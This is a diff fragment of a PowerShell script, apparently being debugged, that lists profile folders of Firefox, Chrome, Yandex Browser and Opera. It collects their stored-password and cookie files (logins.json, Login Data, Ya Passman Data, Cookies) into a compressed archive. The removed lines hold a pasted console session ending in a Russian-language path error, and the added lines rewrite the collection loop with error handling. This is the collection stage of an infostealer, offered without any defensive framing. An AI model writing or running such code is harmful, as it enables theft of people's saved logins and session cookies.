@@ -40,42 +40,17 @@ foreach ($el in $lst)
   }
 }
 
-
-
-PS C:\Users\qwe> $lst = @{0=(($env:APPDATA+"\Mozilla\Firefox\Profiles\*"), "firefox", "logins.json","*.db");
->>          1=(($env:LOCALAPPDATA+"\Google\Chrome\User Data\Default\"), "chrome", "Login Data", "Cookies");
->>          2=(($env:LOCALAPPDATA+"\Yandex\YandexBrowser\User Data\Default\"), "browser", "Ya Passman Data", "Cookies");
->>          3=(($env:APPDATA+"\Opera Software\Opera Stable\"), "Login Data", "Opera123", "Cookies");
->>          4=(($env:APPDATA+"\Opera Software\Opera GX Stable\"),  "Opera5656", "Login Data", "Cookies")}
+for ($i=0; $i -lt 5; $i++) {
 >>
->> foreach ($el in $lst)
->>    {
->>    if(Test-Path -Path $el[0]){
->>      ($el[0] | Out-String)
->>      ($el[1] | Out-String)
->>      ($el[2] | Out-String)
->>      ($el[3] | Out-String)                                                                                                                 >>      Get-ChildItem -Path ($el[0] | Out-String) -Include ($el[2] | Out-String), ($el[3] | Out-String) -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p                                                                                                   >>    }                                                                                                                                       >> }                                                                                                                                          C:\Users\qwe\AppData\Roaming\Mozilla\Firefox\Profiles\*                                                                                       firefox                                                                                                                                       logins.json                                                                                                                                   *.db                                                                                                                                                                                                                                                                                        C:\Users\qwe\AppData\Local\Google\Chrome\User Data\Default\                                                                                   chrome                                                                                                                                        Login Data
-Cookies
-
-C:\Users\qwe\AppData\Local\Yandex\YandexBrowser\User Data\Default\
-browser
-Ya Passman Data
-Cookies
-
-C:\Users\qwe\AppData\Roaming\Opera Software\Opera Stable\
-Login Data
-Opera123
-Cookies
-
-Get-ChildItem : Путь содержит недопустимые знаки.
-строка:14 знак:6
-+      Get-ChildItem -Path ($el[0] | Out-String) -Include ($el[2] | Out ...
-+      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    + CategoryInfo          : InvalidArgument: (C:\Users\qwe\Ap...irefox\Profiles:String) [Get-ChildItem], ArgumentException
-    + FullyQualifiedErrorId : DirArgumentError,Microsoft.PowerShell.Commands.GetChildItemCommand
-
-PS C:\Users\qwe>
-
+>>     if(Test-Path -Path $lst[$i][0]){
+>>     echo ('______{0}' -f $lst[$i][0])
+>>     try{
+>>       Get-ChildItem -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3] -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p
+>> }catch{
+>> echo 'asd'
+>> }
+>> }
+>> }
 
 $f=($env:APPDATA+"\Mozilla\Firefox\Profiles\*");
 if(Test-Path -Path $f)
